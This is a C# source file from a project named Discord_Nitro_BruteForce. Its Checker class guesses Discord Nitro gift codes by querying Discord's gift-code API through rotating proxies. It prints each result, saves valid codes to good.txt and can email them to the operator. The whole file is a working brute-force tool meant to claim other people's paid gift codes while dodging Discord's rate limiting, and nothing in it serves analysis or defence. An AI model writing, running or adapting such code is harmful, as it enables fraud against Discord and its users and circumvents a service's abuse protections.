using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Discord_Nitro_BruteForce
{
    class Checker
    {
        static object fileLocker = new object();
        public static void Check(string code, ProxyClient proxy)
        {
            using (HttpRequest req = new HttpRequest()
            {
                IgnoreProtocolErrors = true,
                Proxy = proxy
            })
            {
                HttpResponse res = req.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}");

                if(res.StatusCode == HttpStatusCode.TooManyRequests)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[RATELIMIT] {code}");
                    throw new HttpException();
                }
                    
                Interlocked.Increment(ref Program.ch);

                if(res.StatusCode == HttpStatusCode.NotFound)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] {code}");
                }

                if (res.StatusCode == HttpStatusCode.OK)
                {
                    Interlocked.Increment(ref Program.goods);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] {code}");

                    lock (fileLocker)
                    {
                        File.AppendAllText("good.txt", code);
                    }

                    if (Program.emailnotification)
                        Program.SendEmail(code, "Hey! I founded valid code!");
                }
            }
        }
    }
}
